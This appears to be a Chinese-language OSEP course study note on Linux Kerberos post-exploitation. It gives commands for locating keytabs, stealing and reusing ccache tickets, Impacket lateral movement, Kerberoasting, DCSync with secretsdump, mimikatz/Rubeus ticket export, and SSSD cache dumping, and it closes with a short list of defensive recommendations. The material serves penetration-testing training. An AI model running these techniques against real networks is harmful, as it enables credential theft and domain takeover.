---
title: OSEP-11-Linux-Kerberos
description: '11-Linux后渗透 | 07-Linux-Kerberos'
pubDate: 2026-01-30T00:01:57+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Linux Machine
  - Active Directory
  - Kerberos
---

# Linux Kerberos利用技术

## 1. Linux Kerberos基础

### Kerberos在Linux上的实现
```
Linux Kerberos组件:
├── MIT Kerberos - 最常见的实现
├── Heimdal Kerberos - 另一种实现
├── SSSD - 系统安全服务守护进程
└── 与Active Directory集成
```

### 关键文件位置
```
Kerberos配置和凭证文件:
├── /etc/krb5.conf - Kerberos配置文件
├── /etc/krb5.keytab - 系统keytab文件
├── /tmp/krb5cc_* - 用户凭证缓存(ccache)
├── ~/.k5login - 授权的Kerberos主体
└── /var/lib/sss/db/ - SSSD缓存
```

---

## 2. Keytab文件利用

### 什么是Keytab文件
```
Keytab文件:
├── 包含Kerberos主体和加密密钥
├── 用于无密码认证
├── 服务账户常用keytab
├── 相当于存储了密码哈希
└── 可以用于获取TGT
```

### 查找Keytab文件
```bash
# 查找系统keytab
ls -la /etc/krb5.keytab
ls -la /etc/*.keytab

# 查找用户keytab
find /home -name "*.keytab" 2>/dev/null
find / -name "*.keytab" 2>/dev/null

# 检查环境变量
echo $KRB5_KTNAME
```

### 查看Keytab内容
```bash
# 使用klist查看keytab
klist -k /etc/krb5.keytab

# 显示详细信息
klist -k -t /etc/krb5.keytab

# 输出示例:
# Keytab name: FILE:/etc/krb5.keytab
# KVNO Principal
# ---- ----------
#    2 host/linuxvictim.corp.com@CORP.COM
#    2 HTTP/linuxvictim.corp.com@CORP.COM
```

### 使用Keytab获取TGT
```bash
# 使用keytab初始化凭证
kinit -k -t /etc/krb5.keytab host/linuxvictim.corp.com@CORP.COM

# 验证票据
klist

# 使用特定主体
kinit -k -t user.keytab user@CORP.COM
```

---

## 3. Ccache文件利用

### 什么是Ccache文件
```
Ccache (Credential Cache) 文件:
├── 存储用户的Kerberos票据
├── 默认位置: /tmp/krb5cc_<UID>
├── 包含TGT和服务票据
├── 可以被窃取和重用
└── 票据有有效期限制
```

### 查找Ccache文件
```bash
# 列出/tmp中的ccache文件
ls -la /tmp/krb5cc_*

# 查找所有ccache文件
find / -name "krb5cc_*" 2>/dev/null

# 检查当前用户的ccache
echo $KRB5CCNAME
klist
```

### 窃取Ccache文件
```bash
# 复制其他用户的ccache (需要root权限)
cp /tmp/krb5cc_1000 /tmp/stolen_ccache

# 设置环境变量使用窃取的ccache
export KRB5CCNAME=/tmp/stolen_ccache

# 验证票据
klist

# 使用票据访问服务
smbclient //dc01.corp.com/share -k
```

### Ccache文件格式
```bash
# 查看ccache文件信息
klist -c /tmp/krb5cc_1000

# 输出示例:
# Ticket cache: FILE:/tmp/krb5cc_1000
# Default principal: user@CORP.COM
#
# Valid starting       Expires              Service principal
# 04/06/2020 12:00:00  04/06/2020 22:00:00  krbtgt/CORP.COM@CORP.COM
# 04/06/2020 12:05:00  04/06/2020 22:00:00  cifs/dc01.corp.com@CORP.COM
```

---

## 4. Kerberos命令工具

### kinit - 获取票据
```bash
# 使用密码获取TGT
kinit user@CORP.COM

# 使用keytab获取TGT
kinit -k -t /path/to/user.keytab user@CORP.COM

# 指定票据有效期
kinit -l 10h user@CORP.COM

# 获取可转发票据
kinit -f user@CORP.COM
```

### klist - 查看票据
```bash
# 查看当前票据
klist

# 查看详细信息
klist -e

# 查看keytab内容
klist -k /etc/krb5.keytab

# 查看所有票据缓存
klist -l
```

### kdestroy - 销毁票据
```bash
# 销毁当前票据
kdestroy

# 销毁所有票据
kdestroy -A

# 销毁特定缓存
kdestroy -c /tmp/krb5cc_1000
```

### kvno - 获取服务票据
```bash
# 获取特定服务的票据
kvno cifs/dc01.corp.com@CORP.COM

# 获取多个服务票据
kvno host/server.corp.com ldap/dc01.corp.com
```

---

## 5. Impacket工具利用

### 使用Ccache进行认证
```bash
# 设置ccache环境变量
export KRB5CCNAME=/tmp/krb5cc_stolen

# 使用psexec.py
python psexec.py -k -no-pass corp.com/user@dc01.corp.com

# 使用smbclient.py
python smbclient.py -k -no-pass corp.com/user@dc01.corp.com

# 使用wmiexec.py
python wmiexec.py -k -no-pass corp.com/user@dc01.corp.com
```

### 使用Keytab进行认证
```bash
# 先用keytab获取票据
kinit -k -t user.keytab user@CORP.COM

# 然后使用Impacket工具
python psexec.py -k -no-pass corp.com/user@dc01.corp.com
```

### GetADUsers.py - 枚举AD用户
```bash
# 使用Kerberos认证枚举用户
python GetADUsers.py -all -k -no-pass -dc-ip 192.168.1.10 corp.com/user

# 输出示例:
# Name                  Email                           PasswordLastSet      LastLogon
# ----                  -----                           ---------------      ---------
# Administrator                                         2020-04-01 10:00:00  2020-04-06 08:00:00
# krbtgt                                                2020-04-01 10:00:00  <never>
# user1                 user1@corp.com                  2020-04-02 14:00:00  2020-04-06 09:00:00
```

### GetUserSPNs.py - Kerberoasting
```bash
# 使用Kerberos认证进行Kerberoasting
python GetUserSPNs.py -k -no-pass -dc-ip 192.168.1.10 corp.com/user

# 请求服务票据
python GetUserSPNs.py -k -no-pass -request -dc-ip 192.168.1.10 corp.com/user

# 输出可以用hashcat破解
# $krb5tgs$23$*svc_sql$CORP.COM$...
```

### secretsdump.py - 提取凭证
```bash
# 使用Kerberos认证进行DCSync
python secretsdump.py -k -no-pass corp.com/admin@dc01.corp.com

# 只提取特定用户
python secretsdump.py -k -no-pass -just-dc-user krbtgt corp.com/admin@dc01.corp.com
```

---

## 6. 票据转换

### Ccache转Kirbi
```bash
# 使用ticketConverter.py
python ticketConverter.py ccache_file.ccache kirbi_file.kirbi

# 或使用impacket
python ticket_converter.py /tmp/krb5cc_1000 ticket.kirbi
```

### Kirbi转Ccache
```bash
# 使用ticketConverter.py
python ticketConverter.py ticket.kirbi ccache_file.ccache

# 设置环境变量使用
export KRB5CCNAME=ccache_file.ccache
```

---

## 7. 跨平台攻击

### 从Windows获取票据用于Linux
```powershell
# 在Windows上导出票据
mimikatz # sekurlsa::tickets /export

# 或使用Rubeus
Rubeus.exe dump /nowrap
```

### 在Linux上使用Windows票据
```bash
# 转换kirbi到ccache
python ticketConverter.py ticket.kirbi ticket.ccache

# 使用票据
export KRB5CCNAME=ticket.ccache
python psexec.py -k -no-pass corp.com/user@target.corp.com
```

### 从Linux获取票据用于Windows
```bash
# 在Linux上获取票据
kinit user@CORP.COM
klist

# 复制ccache文件
cp /tmp/krb5cc_1000 /share/ticket.ccache

# 在Windows上转换并使用
# 使用Rubeus或mimikatz导入
```

---

## 8. SSSD利用

### SSSD缓存位置
```bash
# SSSD缓存数据库
/var/lib/sss/db/cache_DOMAIN.ldb
/var/lib/sss/db/ccache_DOMAIN

# SSSD配置
/etc/sssd/sssd.conf
```

### 提取SSSD缓存
```bash
# 查看SSSD缓存
tdbdump /var/lib/sss/db/cache_CORP.COM.ldb

# 提取密码哈希
# SSSD可能缓存了密码哈希用于离线认证
```

---

## 9. 实战示例

### 完整攻击流程
```bash
# 1. 枚举Kerberos配置
cat /etc/krb5.conf

# 2. 查找keytab文件
find / -name "*.keytab" 2>/dev/null
ls -la /etc/krb5.keytab

# 3. 查看keytab内容
klist -k /etc/krb5.keytab

# 4. 使用keytab获取票据
kinit -k -t /etc/krb5.keytab host/server.corp.com@CORP.COM

# 5. 验证票据
klist

# 6. 查找其他用户的ccache
ls -la /tmp/krb5cc_*

# 7. 窃取ccache (需要root)
export KRB5CCNAME=/tmp/krb5cc_1000

# 8. 使用票据进行横向移动
python psexec.py -k -no-pass corp.com/user@dc01.corp.com

# 9. 或使用smbclient
smbclient //dc01.corp.com/C$ -k
```

---

## 10. 常用命令速查

| 命令 | 说明 |
|------|------|
| `kinit user@REALM` | 获取TGT |
| `kinit -k -t file.keytab principal` | 使用keytab获取TGT |
| `klist` | 查看当前票据 |
| `klist -k file.keytab` | 查看keytab内容 |
| `kdestroy` | 销毁票据 |
| `kvno service/host@REALM` | 获取服务票据 |
| `export KRB5CCNAME=file` | 设置ccache位置 |

---

## 防御建议

```
1. 保护keytab文件权限 (600)
2. 定期轮换keytab密钥
3. 限制ccache文件访问
4. 监控异常Kerberos活动
5. 使用短期票据有效期
6. 实施最小权限原则
7. 审计keytab使用
8. 加密敏感文件
9. 使用SSSD的离线认证限制
10. 定期清理过期票据
```
